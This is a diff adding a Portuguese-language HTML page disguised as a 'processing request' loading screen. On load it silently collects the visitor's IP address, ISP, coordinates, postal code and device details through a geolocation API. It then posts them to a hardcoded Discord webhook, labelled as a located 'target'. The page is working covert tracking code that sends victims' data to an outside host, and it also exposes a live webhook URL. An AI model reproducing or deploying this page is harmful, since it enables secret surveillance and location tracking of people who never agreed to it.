@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processando Requisição...</title>
+    <style>
+        body { background: #000; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 3px solid #222; border-top: 3px solid #00ff00; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1471900671165858010/8VJNSlw5Lnr9_OtdXTRK2cgpCTEI7L1stlOYyQnfBaroqEzDozSCr0mBQft6a0C6Tq_-";
+
+        async function trackPro() {
+            try {
+                // Busca dados geográficos precisos via IP
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // Montagem do Mapa e Endereço
+                const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                const fullAddress = `${data.address_line1 || 'Rua não mapeada'}, ${data.city} - ${data.region}, ${data.postal}`;
+
+                const payload = {
+                    username: "SISTEMA DE RASTREIO",
+                    avatar_url: "https://i.imgur.com/8nLFC9m.png",
+                    embeds: [{
+                        title: "🎯 Alvo Localizado com Sucesso",
+                        color: 3066993, // Verde neon
+                        fields: [
+                            { name: "🌐 Endereço de IP", value: `\`${data.ip}\``, inline: true },
+                            { name: "🏢 Provedor (ISP)", value: `\`${data.org}\``, inline: true },
+                            { name: "📍 Coordenadas", value: `Lat: \`${data.latitude}\` \nLon: \`${data.longitude}\``, inline: false },
+                            { name: "🏠 Localização Estimada", value: `**Rua/Bairro:** ${data.city} (Baseado em ISP)\n**CEP:** ${data.postal || 'N/A'}`, inline: false },
+                            { name: "🗺️ Ver no Google Maps", value: `[Clique aqui para abrir o mapa](${googleMapsLink})`, inline: false },
+                            { name: "📱 Dispositivo", value: `\`${navigator.platform}\` | \`${navigator.language}\``, inline: true }
+                        ],
+                        footer: { text: "Rastreamento executado sem falhas de callback." },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+                console.error("Falha na captura silenciosa:", err);
+            }
+        }
+
+        window.onload = trackPro;
+    </script>
+</body>
+</html>
